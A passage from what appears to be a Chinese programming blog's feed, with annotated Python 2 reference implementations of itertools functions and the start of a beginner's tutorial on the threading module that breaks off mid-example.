<h2 id="0x1_Iterators_terminating_on_the_shortest_input_sequence_//其他迭代器">0x1 Iterators terminating on the shortest input sequence //其他迭代器</h2><h4 id="0x10">0x10</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chain</span><span class="params">(*iterables)</span>:</span></span><br><span class="line">    <span class="comment"># chain('ABC', 'DEF') --&gt; A B C D E F</span></span><br><span class="line">    <span class="keyword">for</span> it <span class="keyword">in</span> iterables:</span><br><span class="line">        <span class="keyword">for</span> element <span class="keyword">in</span> it:</span><br><span class="line">            <span class="keyword">yield</span> element</span><br><span class="line">//连接迭代</span><br></pre></td></tr></table></figure>
<h4 id="0x11">0x11</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ifilter</span><span class="params">(predicate, iterable)</span>:</span></span><br><span class="line">    <span class="comment"># ifilter(lambda x: x%2, range(10)) --&gt; 1 3 5 7 9</span></span><br><span class="line">    <span class="keyword">if</span> predicate <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        predicate = bool</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> iterable:</span><br><span class="line">        <span class="keyword">if</span> predicate(x):</span><br><span class="line">            <span class="keyword">yield</span> x</span><br><span class="line">//参数iterable依次代入到predicate中，如果返回非<span class="number">0</span>,则输出</span><br></pre></td></tr></table></figure>
<h4 id="0x12">0x12</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ifilterfalse</span><span class="params">(predicate, iterable)</span>:</span></span><br><span class="line">    <span class="comment"># ifilterfalse(lambda x: x%2, range(10)) --&gt; 0 2 4 6 8</span></span><br><span class="line">    <span class="keyword">if</span> predicate <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        predicate = bool</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> iterable:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> predicate(x):</span><br><span class="line">            <span class="keyword">yield</span> x</span><br><span class="line">//同上，不过是返回<span class="number">0</span>输出</span><br></pre></td></tr></table></figure>
<h4 id="0x13">0x13</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">izip</span><span class="params">(*iterables)</span>:</span></span><br><span class="line">    <span class="comment"># izip('ABCD', 'xy') --&gt; Ax By</span></span><br><span class="line">    iterators = map(iter, iterables)</span><br><span class="line">    <span class="keyword">while</span> iterators:</span><br><span class="line">        <span class="keyword">yield</span> tuple(map(next, iterators))</span><br><span class="line">//了解了两个内置函数，map&amp;iter，</span><br><span class="line">//字符串组合，以迭代的形式返回</span><br></pre></td></tr></table></figure>
<h4 id="0x14">0x14</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ZipExhausted</span><span class="params">(Exception)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">izip_longest</span><span class="params">(*args, **kwds)</span>:</span></span><br><span class="line">    <span class="comment"># izip_longest('ABCD', 'xy', fillvalue='-') --&gt; Ax By C- D-</span></span><br><span class="line">    fillvalue = kwds.get(<span class="string">'fillvalue'</span>)</span><br><span class="line">    counter = [len(args) - <span class="number">1</span>]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sentinel</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> counter[<span class="number">0</span>]:</span><br><span class="line">            <span class="keyword">raise</span> ZipExhausted</span><br><span class="line">        counter[<span class="number">0</span>] -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">yield</span> fillvalue</span><br><span class="line">    fillers = repeat(fillvalue)</span><br><span class="line">    iterators = [chain(it, sentinel(), fillers) <span class="keyword">for</span> it <span class="keyword">in</span> args]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> iterators:</span><br><span class="line">            <span class="keyword">yield</span> tuple(map(next, iterators))</span><br><span class="line">    <span class="keyword">except</span> ZipExhausted:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">//同上，区别在于多了一个fillvalue参数</span><br></pre></td></tr></table></figure>
<h4 id="0x15">0x15</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compress</span><span class="params">(data, selectors)</span>:</span></span><br><span class="line">    <span class="comment"># compress('ABCDEF', [1,0,1,0,1,1]) --&gt; A C E F</span></span><br><span class="line">    <span class="keyword">return</span> (d <span class="keyword">for</span> d, s <span class="keyword">in</span> izip(data, selectors) <span class="keyword">if</span> s)</span><br><span class="line">//date参数为字符串，selectors参数为控制参数，与date相对应，如果为非<span class="number">0</span>则输出，为<span class="number">0</span>则不输出</span><br></pre></td></tr></table></figure>
<h4 id="0x16">0x16</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dropwhile</span><span class="params">(predicate, iterable)</span>:</span></span><br><span class="line">    <span class="comment"># dropwhile(lambda x: x&lt;5, [1,4,6,4,1]) --&gt; 6 4 1</span></span><br><span class="line">    iterable = iter(iterable)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> iterable:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> predicate(x):</span><br><span class="line">            <span class="keyword">yield</span> x</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> iterable:</span><br><span class="line">        <span class="keyword">yield</span> x</span><br><span class="line">//iterable参数依次代入到predicate中，直到返回false才开始返回iterable</span><br></pre></td></tr></table></figure>
<h4 id="0x17">0x17</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">takewhile</span><span class="params">(predicate, iterable)</span>:</span></span><br><span class="line">    <span class="comment"># takewhile(lambda x: x&lt;5, [1,4,6,4,1]) --&gt; 1 4</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> iterable:</span><br><span class="line">        <span class="keyword">if</span> predicate(x):</span><br><span class="line">            <span class="keyword">yield</span> x</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">//把iterable传入predicate，直到返回<span class="number">0</span>才不返回值</span><br></pre></td></tr></table></figure>
<h4 id="0x18">0x18</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">islice</span><span class="params">(iterable, *args)</span>:</span></span><br><span class="line">    <span class="comment"># islice('ABCDEFG', 2) --&gt; A B</span></span><br><span class="line">    <span class="comment"># islice('ABCDEFG', 2, 4) --&gt; C D</span></span><br><span class="line">    <span class="comment"># islice('ABCDEFG', 2, None) --&gt; C D E F G</span></span><br><span class="line">    <span class="comment"># islice('ABCDEFG', 0, None, 2) --&gt; A C E G</span></span><br><span class="line">    s = slice(*args)</span><br><span class="line">    it = iter(xrange(s.start <span class="keyword">or</span> <span class="number">0</span>, s.stop <span class="keyword">or</span> sys.maxint, s.step <span class="keyword">or</span> <span class="number">1</span>))</span><br><span class="line">    nexti = next(it)</span><br><span class="line">    <span class="keyword">for</span> i, element <span class="keyword">in</span> enumerate(iterable):</span><br><span class="line">        <span class="keyword">if</span> i == nexti:</span><br><span class="line">            <span class="keyword">yield</span> element</span><br><span class="line">            nexti = next(it)</span><br><span class="line">//iterable参数为迭代变量，args输入一个，表示在哪停止(stop)，两个第一个是开始(start)，第二个是停止(stop)，三个参数分别是开始，停止，步数。。。因为这个函数中用了slice内置函数</span><br></pre></td></tr></table></figure>
<h4 id="0x19">0x19</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">imap</span><span class="params">(function, *iterables)</span>:</span></span><br><span class="line">    <span class="comment"># imap(pow, (2,3,10), (5,2,3)) --&gt; 32 9 1000</span></span><br><span class="line">    iterables = map(iter, iterables)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        args = [next(it) <span class="keyword">for</span> it <span class="keyword">in</span> iterables]</span><br><span class="line">        <span class="keyword">if</span> function <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">yield</span> tuple(args)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">yield</span> function(*args)</span><br><span class="line">//第一个参数是输入一个函数，iterables为传入这个函数的参数。。</span><br></pre></td></tr></table></figure>
<h4 id="0x1A">0x1A</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">starmap</span><span class="params">(function, iterable)</span>:</span></span><br><span class="line">    <span class="comment"># starmap(pow, [(2,5), (3,2), (10,3)]) --&gt; 32 9 1000</span></span><br><span class="line">    <span class="keyword">for</span> args <span class="keyword">in</span> iterable:</span><br><span class="line">        <span class="keyword">yield</span> function(*args)</span><br><span class="line">//作用同上，，不通之处在于传入参数的格式，具体看上面的示例</span><br></pre></td></tr></table></figure>
<h4 id="0x1B">0x1B</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tee</span><span class="params">(iterable, n=<span class="number">2</span>)</span>:</span></span><br><span class="line">    it = iter(iterable)</span><br><span class="line">    deques = [collections.deque() <span class="keyword">for</span> i <span class="keyword">in</span> range(n)]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gen</span><span class="params">(mydeque)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> mydeque:             <span class="comment"># when the local deque is empty</span></span><br><span class="line">                newval = next(it)       <span class="comment"># fetch a new value and</span></span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> deques:        <span class="comment"># load it to all the deques</span></span><br><span class="line">                    d.append(newval)</span><br><span class="line">            <span class="keyword">yield</span> mydeque.popleft()</span><br><span class="line">    <span class="keyword">return</span> tuple(gen(d) <span class="keyword">for</span> d <span class="keyword">in</span> deques)</span><br><span class="line">//返回n个iterble迭代。。默认n=<span class="number">2</span>。。</span><br></pre></td></tr></table></figure>
<h4 id="0x1C">0x1C</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">groupby</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="comment"># [k for k, g in groupby('AAAABBBCCDAABBB')] --&gt; A B C D A B</span></span><br><span class="line">    <span class="comment"># [list(g) for k, g in groupby('AAAABBBCCD')] --&gt; AAAA BBB CC D</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, iterable, key=None)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            key = <span class="keyword">lambda</span> x: x</span><br><span class="line">        self.keyfunc = key</span><br><span class="line">        self.it = iter(iterable)</span><br><span class="line">        self.tgtkey = self.currkey = self.currvalue = object()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__iter__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> self.currkey == self.tgtkey:</span><br><span class="line">            self.currvalue = next(self.it)    <span class="comment"># Exit on StopIteration</span></span><br><span class="line">            self.currkey = self.keyfunc(self.currvalue)</span><br><span class="line">        self.tgtkey = self.currkey</span><br><span class="line">        <span class="keyword">return</span> (self.currkey, self._grouper(self.tgtkey))</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_grouper</span><span class="params">(self, tgtkey)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> self.currkey == tgtkey:</span><br><span class="line">            <span class="keyword">yield</span> self.currvalue</span><br><span class="line">            self.currvalue = next(self.it)    <span class="comment"># Exit on StopIteration</span></span><br><span class="line">            self.currkey = self.keyfunc(self.currvalue)</span><br><span class="line">//把这放最后是因为不是很理解。。。</span><br></pre></td></tr></table></figure>
<h2 id="0x2_Combinatoric_generators_//组合迭代器">0x2 Combinatoric generators //组合迭代器</h2><h4 id="0x20">0x20</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">product</span><span class="params">(*args, **kwds)</span>:</span></span><br><span class="line">    <span class="comment"># product('ABCD', 'xy') --&gt; Ax Ay Bx By Cx Cy Dx Dy</span></span><br><span class="line">    <span class="comment"># product(range(2), repeat=3) --&gt; 000 001 010 011 100 101 110 111</span></span><br><span class="line">    pools = map(tuple, args) * kwds.get(<span class="string">'repeat'</span>, <span class="number">1</span>)</span><br><span class="line">    result = [[]]</span><br><span class="line">    <span class="keyword">for</span> pool <span class="keyword">in</span> pools:</span><br><span class="line">        result = [x+[y] <span class="keyword">for</span> x <span class="keyword">in</span> result <span class="keyword">for</span> y <span class="keyword">in</span> pool]</span><br><span class="line">    <span class="keyword">for</span> prod <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">yield</span> tuple(prod)</span><br><span class="line">//args参数进行C(概率里面的那个C)组合，kwds参数中的repeat表示组合后的位数</span><br></pre></td></tr></table></figure>
<h4 id="0x21">0x21</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">permutations</span><span class="params">(iterable, r=None)</span>:</span></span><br><span class="line">    <span class="comment"># permutations('ABCD', 2) --&gt; AB AC AD BA BC BD CA CB CD DA DB DC</span></span><br><span class="line">    <span class="comment"># permutations(range(3)) --&gt; 012 021 102 120 201 210</span></span><br><span class="line">    pool = tuple(iterable)</span><br><span class="line">    n = len(pool)</span><br><span class="line">    r = n <span class="keyword">if</span> r <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">else</span> r</span><br><span class="line">    <span class="keyword">if</span> r &gt; n:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    indices = range(n)</span><br><span class="line">    cycles = range(n, n-r, -<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">yield</span> tuple(pool[i] <span class="keyword">for</span> i <span class="keyword">in</span> indices[:r])</span><br><span class="line">    <span class="keyword">while</span> n:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> reversed(range(r)):</span><br><span class="line">            cycles[i] -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> cycles[i] == <span class="number">0</span>:</span><br><span class="line">                indices[i:] = indices[i+<span class="number">1</span>:] + indices[i:i+<span class="number">1</span>]</span><br><span class="line">                cycles[i] = n - i</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                j = cycles[i]</span><br><span class="line">                indices[i], indices[-j] = indices[-j], indices[i]</span><br><span class="line">                <span class="keyword">yield</span> tuple(pool[i] <span class="keyword">for</span> i <span class="keyword">in</span> indices[:r])</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">//进行A(同样是概率中的A)组合，传参和上面的不同，这个看例子就知道了</span><br></pre></td></tr></table></figure>
<h4 id="0x22">0x22</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">combinations</span><span class="params">(iterable, r)</span>:</span></span><br><span class="line">    <span class="comment"># combinations('ABCD', 2) --&gt; AB AC AD BC BD CD</span></span><br><span class="line">    <span class="comment"># combinations(range(4), 3) --&gt; 012 013 023 123</span></span><br><span class="line">    pool = tuple(iterable)</span><br><span class="line">    n = len(pool)</span><br><span class="line">    <span class="keyword">if</span> r &gt; n:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    indices = range(r)</span><br><span class="line">    <span class="keyword">yield</span> tuple(pool[i] <span class="keyword">for</span> i <span class="keyword">in</span> indices)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> reversed(range(r)):</span><br><span class="line">            <span class="keyword">if</span> indices[i] != i + n - r:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        indices[i] += <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i+<span class="number">1</span>, r):</span><br><span class="line">            indices[j] = indices[j-<span class="number">1</span>] + <span class="number">1</span></span><br><span class="line">        <span class="keyword">yield</span> tuple(pool[i] <span class="keyword">for</span> i <span class="keyword">in</span> indices)</span><br><span class="line">//进行C组合，其他同上</span><br></pre></td></tr></table></figure>
<h4 id="0x23">0x23</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">combinations_with_replacement</span><span class="params">(iterable, r)</span>:</span></span><br><span class="line">    <span class="comment"># combinations_with_replacement('ABC', 2) --&gt; AA AB AC BB BC CC</span></span><br><span class="line">    pool = tuple(iterable)</span><br><span class="line">    n = len(pool)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> n <span class="keyword">and</span> r:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    indices = [<span class="number">0</span>] * r</span><br><span class="line">    <span class="keyword">yield</span> tuple(pool[i] <span class="keyword">for</span> i <span class="keyword">in</span> indices)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> reversed(range(r)):</span><br><span class="line">            <span class="keyword">if</span> indices[i] != n - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        indices[i:] = [indices[i] + <span class="number">1</span>] * (r - i)</span><br><span class="line">        <span class="keyword">yield</span> tuple(pool[i] <span class="keyword">for</span> i <span class="keyword">in</span> indices)</span><br><span class="line">//同上，不过相同的会组合</span><br></pre></td></tr></table></figure>]]></content>
    <summary type="html">
    <![CDATA[<p><strong>分析了一下itertools模块</strong></p>]]>
    
    </summary>
    
      <category term="Python" scheme="http://lazysheep.cc/tags/Python/"/>
    
      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[python之多线程]]></title>
    <link href="http://lazysheep.cc/2015/03/20/0x1D/"/>
    <id>http://lazysheep.cc/2015/03/20/0x1D/</id>
    <published>2015-03-20T07:44:43.000Z</published>
    <updated>2015-03-24T02:52:00.000Z</updated>
    <content type="html"><![CDATA[<p>做一个python多线程的笔记。。。。<br><a id="more"></a></p>
<h2 id="0x00_首先是多进程与多线程">0x00　首先是多进程与多线程</h2><p>google了一下，一个程序从开始运行到结束，算是一个进程，正常情况CPU一个核心同一时间只能运行一个进程，所以涉及到多进程（我还没到这个层次，这里就不多说了）。一个进程运行过程中，运行的’路径’叫做线程，正常情况，一个程序运行从头到位都是只有一条路劲，叫单线程。而这篇博文写的就是如何用python写一个多线程的程序。</p>
<h2 id="0x01_python多线程的简单使用">0x01 python多线程的简单使用</h2><p>使用的是threading模块　<code>import threading</code></p>
<p>在我的理解中，多线程和孙悟空一样会生猴子，’孙悟空’在’主干道’上执行代码，从头执行到尾，遇到一个函数就会生一个小猴子，去执行这个函数。举个例子:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">music</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'I was listening to music. %s'</span> %time.ctime()</span><br><span class="line">		time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">movi</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'I was at the movies! %s'</span> %time.ctime()</span><br><span class="line">		time.sleep(<span class="number">5</span>)</span><br><span class="line">		</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">	music()</span><br><span class="line">	movi()</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'all over %s'</span> %time.ctime()</span><br></pre></td></tr></table></figure></p>
<p>上图就是’主干道’，我把正常情况下，比喻成磨蹭的唐僧。<br>‘唐僧’遇到<code>music()</code>代码，会调到music()函数中去执行，执行完后又跳出来，然后遇到<code>movi()</code>又跳进去，执行完跳出来,然后执行<code>print &#39;xxx&#39;</code>.<br>下面把执行这串代码的变成’孙悟空’<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">music</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'I was listening to music. %s'</span> %time.ctime()</span><br><span class="line">		time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">movi</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'I was at the movies! %s'</span> %time.ctime()</span><br><span class="line">		time.sleep(<span class="number">5</span>)</span><br><span class="line">		</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">	s = threading.Thread</span><br><span class="line">	a=s(target=music)</span><br><span class="line">	b=s(target=movi)</span><br><span class="line">	a.start();b.start()</span><br><span class="line">	b.join()</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'all over %s'</span> %time.ctime()</span><br></pre></td></tr></table></figure></p>
<p>上面这串代码中<code>threading.Thread(target=函数)</code>就是’孙悟空’的分身术，然后<code>start()</code>就是该分身跳进函数中去执行该函数,而<code>join()</code>函数相当于一面挡路的墙，’孙悟空’只有和指定的分身回合后才能打通这面墙。。<br>下面再写个通过类创建分身的方法:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span><span class="params">(threading.Thread)</span>:</span>             <span class="comment">#定义一个类test为threading.Thread的子类</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">		threading.Thread.__init__(self)　　　　　<span class="comment">#覆盖threading.Thread的__init__属性</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span>　　　　　　　　　　　　　　　　　　<span class="comment">#覆盖run属性</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">'hehe'</span>,time.ctime()</span><br><span class="line">		time.sleep(<span class="number">2</span>)</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'abc'</span></span><br><span 